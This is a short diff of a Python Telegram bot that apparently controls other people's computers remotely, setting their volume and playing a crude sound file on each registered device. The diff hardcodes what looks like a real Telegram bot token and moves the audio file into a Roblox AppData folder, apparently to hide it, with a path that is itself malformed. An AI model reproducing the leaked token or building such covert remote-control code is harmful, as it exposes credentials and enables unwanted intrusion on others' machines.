@@ -19,7 +19,7 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 import pygame
 
-bot_token = 'your bot token from -> @BotFather'
+bot_token = '7615104148:AAFk0NVPm-tpooR-83rY7tpFHr0K58VpIHk'
 bot = telebot.TeleBot(bot_token)
 
 devices = {}
@@ -109,10 +109,12 @@ def play_sound(message):
             bot.send_message(message.chat.id, "Usage: /mouse")
             return
 
+        current_user = getpass.getuser()
+
         for device_id in devices.keys():
             set_volume()
             pygame.init()
-            song = pygame.mixer.Sound('ass.mp3')
+            song = pygame.mixer.Sound(rf'C:\{current_user}\AppData\Local\Roblox\Musics\ass.mp3')
             song.play()
             
             time.sleep(song.get_length())
